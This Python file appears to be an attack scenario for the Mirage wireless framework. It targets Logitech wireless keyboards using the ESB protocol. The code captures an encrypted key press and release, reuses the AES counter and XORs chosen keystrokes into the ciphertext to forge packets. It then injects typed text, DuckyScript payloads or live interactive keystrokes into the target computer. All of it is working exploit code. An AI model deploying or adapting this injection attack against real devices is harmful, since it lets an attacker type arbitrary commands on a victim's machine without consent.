from threading import Lock

from mirage.core import scenario
from mirage.libs import io, utils
from mirage.libs.common import parsers
from mirage.libs.esb_utils.dissectors import LogitechKeystroke
from mirage.libs.esb_utils.packets import ESBLogitechEncryptedKeystrokePacket, ESBLogitechKeepAlivePacket, ESBLogitechSetTimeoutPacket
from mirage.libs.wireless_utils.packetQueue import StoppableThread
from mirage.libs.wireless_utils.packets import WaitPacket


class logitech_encrypted_keystrokes_injection(scenario.Scenario):
	def addLogitechKeystroke(self,locale="fr",key="a",ctrl=False, alt=False, gui=False,shift=False):
		keystrokes = []
		keystrokeUnencryptedPayload = LogitechKeystroke(locale=locale,key=key,ctrl=ctrl,alt=alt,gui=gui,shift=shift).data
		forgedPayload = bytes([self.lastKeyRelease.hidData[i] ^ keystrokeUnencryptedPayload[i] for i in range(len(self.lastKeyRelease.hidData))])
		io.info("Forged payload: "+forgedPayload.hex())
		keystrokes.append(ESBLogitechEncryptedKeystrokePacket(address=self.target,aesCounter=self.lastKeyRelease.aesCounter,unknown=self.lastKeyRelease.unknown,hidData = forgedPayload))
		keystrokes.append(WaitPacket(time=12/1000.0))
		keystrokes.append(ESBLogitechKeepAlivePacket(address=self.target,timeout=1200))
		keystrokes.append(ESBLogitechEncryptedKeystrokePacket(address=self.target,aesCounter=self.lastKeyRelease.aesCounter,unknown=self.lastKeyRelease.unknown,hidData = self.lastKeyRelease.hidData))
		return keystrokes

	def addLogitechDelay(self,duration=1000):
		keystrokes = []
		number = int(duration / 10.0)
		for _ in range(number):
			keystrokes.append(ESBLogitechKeepAlivePacket(address=self.target,timeout=1200))
			keystrokes.append(WaitPacket(time=10.0/1000.0))
		return keystrokes

	def addLogitechText(self,string="hello world !",locale="fr"):
		keystrokes = []
		for letter in string:
			keystrokes += self.addLogitechKeystroke(key=letter,locale=locale)
		return keystrokes

	def startLogitechInjection(self,timeout=1200):
		keystrokes=[ESBLogitechSetTimeoutPacket(address=self.target,timeout=1200)]
		return keystrokes

	def keepAlive(self):
		while True:
			self.lock.acquire()
			self.emitter.sendp(*self.addLogitechDelay(duration=1200))
			self.lock.release()
			utils.wait(seconds=1)

	def onESBLogitechEncryptedKeystrokePacket(self,pkt):
		pkt.show()
		if self.lastKeyPress is None:
			self.lastKeyPress = pkt
		elif self.lastKeyRelease is None:
			self.lastKeyRelease = pkt
			io.info("AES Counter: "+str(pkt.aesCounter))
			io.info("Encrypted data: "+str(pkt.hidData.hex()))

	def onStart(self):
		self.emitter = self.module.emitter
		self.receiver = self.module.receiver
		self.target = utils.addressArg(self.module.target)
		self.lock = Lock()
		self.mode = None

		self.lastKeyPress = None
		self.lastKeyRelease = None

		io.info("Following mode disabled by the scenario.")
		self.module.stopFollowing()

		self.receiver.onEvent("ESBLogitechEncryptedKeystrokePacket",self.onESBLogitechEncryptedKeystrokePacket)

		io.info("Looking for target "+str(self.target)+"...")
		while not self.emitter.scan():
			utils.wait(seconds=0.1)
		io.success("Target found !")	
		while self.lastKeyPress is None or self.lastKeyRelease is None:
			utils.wait(seconds=0.1)
		
		io.info("Generating attack stream ...")
		attackStream = self.startLogitechInjection()

		if "TEXT" in self.module.args and self.module.args["TEXT"] != "":
			self.mode = "text"
			text = self.module.args["TEXT"]
			io.info("Text injection: "+text)
			attackStream += self.addLogitechDelay(duration=100)
			attackStream += self.addLogitechText(text)
		elif "INTERACTIVE" in self.module.args and utils.booleanArg(self.module.args["INTERACTIVE"]):
			self.mode = "interactive"
			io.info("Interactive mode")
			self.keepAliveThread = StoppableThread(self.keepAlive)
			self.keepAliveThread.start()
		elif "DUCKYSCRIPT" in self.module.args and self.module.args["DUCKYSCRIPT"] != "":
			self.mode = "duckyscript"
			io.info("Duckyscript injection: "+self.module.args["DUCKYSCRIPT"])
			parser = parsers.DuckyScriptParser(filename=self.args["DUCKYSCRIPT"])
			attackStream = parser.generatePackets(
				textFunction=self.addLogitechText,
				initFunction=self.startLogitechInjection,
				keyFunction=self.addLogitechKeystroke,
				sleepFunction=self.addLogitechDelay
				)
		else:
			io.fail("You must provide one of the following parameters:\n\tINTERACTIVE : live keystroke injection\n\tTEXT : simple text injection\n\tDUCKYSCRIPT : duckyscript injection")
			self.module.stopScenario()
			return True
		
		io.info("Injecting ...")
		self.emitter.sendp(*attackStream)
		if self.mode != "interactive":
			while not self.emitter.isTransmitting():
				utils.wait(seconds=0.5)
			while self.emitter.isTransmitting():
				utils.wait(seconds=0.5)
			self.module.stopScenario()
		return True

	def onEnd(self):
		io.info("Terminating scenario ...")
		if self.mode == "interactive":
			self.keepAliveThread.stop()
			self.keepAliveThread = None
		return True
	
	def onKey(self,key):
		if key == "esc":
			self.module.stopScenario()
			return True
		if self.mode == "interactive":
			injectedKeystroke = ""
			if key == "space":
				injectedKeystroke = " "
			elif key == "delete":
				injectedKeystroke = "DEL"
			elif key in ["enter","shift","alt","ctrl","backspace","up","down","left","right","f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f12"]:
				injectedKeystroke = key.upper()
			else:
				injectedKeystroke = key
			io.info("Injecting:"+str(injectedKeystroke))
			self.lock.acquire()
			self.emitter.clear()
			self.emitter.sendp(*(self.addLogitechKeystroke(key=injectedKeystroke,locale="fr")+self.addLogitechDelay()))
			self.lock.release()
		return True	
